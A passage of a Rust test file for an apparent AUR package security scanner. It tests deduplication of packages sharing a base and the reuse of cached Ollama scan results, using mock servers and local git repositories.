        assert!(matches!(results[0].result, ScanResult::Clean));
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // End-to-end paru-mode tests (Task 9)
    // ═══════════════════════════════════════════════════════════════════════════

    /// Full end-to-end pipeline:
    /// 1. Scan 2 packages sharing a PackageBase → dedup → 1 Ollama call
    /// 2. Verify results cached with paru cache keys
    /// 3. Re-scan the same packages → cache hit → 0 Ollama calls
    #[tokio::test]
    async fn test_paru_mode_end_to_end() {
        let tmp = tempfile::tempdir().unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let pkgbase = "shared-lib";
        let pkgbuild_content =
            "# Maintainer: Shared\npkgname=libfoo\npkgver=3.0\npkgrel=1\n";

        // Set up shared git upstream
        let bare_root = tmp.path().join("bare");
        std::fs::create_dir_all(&bare_root).unwrap();
        let upstream = bare_root.join(pkgbase);
        std::fs::create_dir_all(&upstream).unwrap();
        git(&upstream, &["init", "--bare", "--initial-branch=master"]);

        let work = tmp.path().join("work");
        std::fs::create_dir_all(&work).unwrap();
        git(&work, &["init", "--initial-branch=master"]);
        std::fs::write(work.join("PKGBUILD"), pkgbuild_content).unwrap();
        git(&work, &["add", "PKGBUILD"]);
        git(&work, &["commit", "-m", "v1: shared-lib PKGBUILD"]);
        git(
            &work,
            &[
                "remote",
                "add",
                "origin",
                &format!("file://{}", upstream.display()),
            ],
        );
        git(&work, &["push", "-u", "origin", "master"]);

        let clone_dir = tmp.path().join("paru-clone");
        let aur_url_str = format!("file://{}", bare_root.display());

        let mk_dg = || {
            let mut fetch = Fetch::with_combined_cache_dir(&clone_dir);
            fetch.aur_url = aur_url_str.parse().unwrap();
            DiffGenerator { fetch }
        };

        fn aur_rpc_body() -> serde_json::Value {
            serde_json::json!({"results": [
                {
                    "Name": "libfoo",
                    "PackageBase": "shared-lib",
                    "Version": "3.0-1",
                    "URLPath": "/cgit/aur.git/snapshot/shared-lib.tar.gz",
                    "Description": "Library foo"
                },
                {
                    "Name": "libfoo-dev",
                    "PackageBase": "shared-lib",
                    "Version": "3.0-1",
                    "URLPath": "/cgit/aur.git/snapshot/shared-lib.tar.gz",
                    "Description": "Library foo dev headers"
                }
            ]})
        }

        // ── First scan: 2 packages, shared base → dedup → 1 Ollama call ──
        {
            let server = MockServer::start().await;

            // AUR RPC with .expect(1) — exactly one call for both packages
            Mock::given(method("GET"))
                .and(path("/rpc/v5/info"))
                .respond_with(ResponseTemplate::new(200).set_body_json(aur_rpc_body()))
                .expect(1)
                .mount(&server)
                .await;

            // Dedup: 2 packages, same base → 1 Ollama call
            mount_ollama_clean(&server, 1).await;

            let scanner = test_scanner_paru(&server, cache_dir.path(), mk_dg());
            let results = scanner
                .scan_packages(&["libfoo", "libfoo-dev"])
                .await
                .unwrap();

            assert_eq!(results.len(), 2);
            assert_eq!(results[0].name, "libfoo");
            assert_eq!(results[0].base, pkgbase);
            assert_eq!(results[0].version, "3.0-1");
            assert!(matches!(results[0].result, ScanResult::Clean));

            assert_eq!(results[1].name, "libfoo-dev");
            assert_eq!(results[1].base, pkgbase);
            assert_eq!(results[1].version, "3.0-1");
            assert!(matches!(results[1].result, ScanResult::Clean));

            // Verify results cached with paru cache keys
            let dg = mk_dg();
            let diff_result = dg.generate_diff(pkgbase).unwrap();
            let commit_hash = diff_result.commit_hash.as_deref();
            let cached = scanner
                .cache
                .get_paru_result(pkgbase, "3.0-1", commit_hash);
            assert!(
                matches!(cached, Some(ScanResult::Clean)),
                "Expected cached Clean result, got {cached:?}"
            );
        }

        // ── Second scan: cache hit → 0 Ollama calls ──
        {
            let server = MockServer::start().await;

            Mock::given(method("GET"))
                .and(path("/rpc/v5/info"))
                .respond_with(ResponseTemplate::new(200).set_body_json(aur_rpc_body()))
                .expect(1)
                .mount(&server)
                .await;

            mount_ollama_clean(&server, 0).await;

            let scanner = test_scanner_paru(&server, cache_dir.path(), mk_dg());
            let results = scanner
                .scan_packages(&["libfoo", "libfoo-dev"])
                .await
                .unwrap();

            assert_eq!(results.len(), 2);
            assert!(matches!(results[0].result, ScanResult::Clean));
            assert!(matches!(results[1].result, ScanResult::Clean));
        }
    }

    /// Pre-populate the paru cache directly, then scan → cache hit → 0 Ollama calls.
    #[tokio::test]
    async fn test_paru_mode_cache_reuse_e2e() {
        let tmp = tempfile::tempdir().unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let pkgbase = "cache-reuse-e2e";
        let pkgbuild_content =
            "# Maintainer: CR\npkgname=cache-reuse-e2e\npkgver=1.0\npkgrel=1\n";

        // Set up git upstream
        let bare_root = tmp.path().join("bare");
        std::fs::create_dir_all(&bare_root).unwrap();
        let upstream = bare_root.join(pkgbase);
        std::fs::create_dir_all(&upstream).unwrap();
        git(&upstream, &["init", "--bare", "--initial-branch=master"]);

        let work = tmp.path().join("work");
        std::fs::create_dir_all(&work).unwrap();
        git(&work, &["init", "--initial-branch=master"]);
        std::fs::write(work.join("PKGBUILD"), pkgbuild_content).unwrap();
        git(&work, &["add", "PKGBUILD"]);
        git(&work, &["commit", "-m", "v1"]);
        git(
            &work,
            &[
                "remote",
                "add",
                "origin",
                &format!("file://{}", upstream.display()),
            ],
        );
        git(&work, &["push", "-u", "origin", "master"]);

        let clone_dir = tmp.path().join("paru-clone");
        let aur_url_str = format!("file://{}", bare_root.display());

        let mk_dg = || {
            let mut fetch = Fetch::with_combined_cache_dir(&clone_dir);
            fetch.aur_url = aur_url_str.parse().unwrap();
            DiffGenerator { fetch }
        };

        // Pre-populate the paru cache: generate diff to get commit hash, then store
        let dg = mk_dg();
        let diff_result = dg.generate_diff(pkgbase).unwrap();
        let commit_hash = diff_result.commit_hash.unwrap();

        let cache = FileCache::with_dir(cache_dir.path().to_path_buf());
        cache.store_paru_result(pkgbase, "1.0-1", Some(&commit_hash), &ScanResult::Clean);

        // Now scan → should be cache hit → 0 Ollama calls
        let server = MockServer::start().await;

        mount_aur_rpc(
            &server,
            serde_json::json!([{
                "Name": pkgbase,
                "PackageBase": pkgbase,
                "Version": "1.0-1",
                "URLPath": "/cgit/aur.git/snapshot/cache-reuse-e2e.tar.gz",
                "Description": "Cache reuse e2e test"
            }]),
        )
        .await;

        mount_ollama_clean(&server, 0).await;

        let scanner = test_scanner_paru(&server, cache_dir.path(), mk_dg());
        let results = scanner.scan_packages(&[pkgbase]).await.unwrap();

        assert_eq!(results.len(), 1);
        assert_eq!(results[0].name, pkgbase);
        assert_eq!(results[0].base, pkgbase);
        assert_eq!(results[0].version, "1.0-1");
        assert!(matches!(results[0].result, ScanResult::Clean));
    }
}
